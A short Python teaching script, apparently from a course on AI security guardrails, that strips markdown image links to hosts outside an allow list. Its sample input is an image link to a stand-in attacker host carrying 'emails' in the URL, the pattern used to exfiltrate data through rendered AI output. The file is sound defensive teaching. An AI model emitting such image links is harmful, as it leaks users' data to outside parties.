"""Zero to AI Engineer · Security and Guardrails · Part 2 of 11
Slide: Stripping unsafe image links
Run: python 03_stripping_unsafe_image_links.py
"""
# --- repeated from 02_checking_the_real_hostname.py so this file runs on its own ---
from urllib.parse import urlsplit
ALLOWED = ("learn.microsoft.com",
           "intranet.example.com")
def allowed(url: str) -> bool:
    try:
        u = urlsplit(url.strip())
        host = (u.hostname or "").lower()
    except ValueError:
        return False
    return any(host == d or
               host.endswith("." + d)
               for d in ALLOWED)

# --- this slide ---
import re
INLINE = re.compile(
    r"(!?)\[([^\]]*)\]"
    r"\(\s*<?([^)\s>]+)>?[^)]*\)")
def fix(m):
    if allowed(m.group(3)):
        return m.group(0)
    if m.group(1):
        return "[image removed]"
    return m.group(2)
md = "![x](https://evil.example/?d=emails)"
print(INLINE.sub(fix, md))
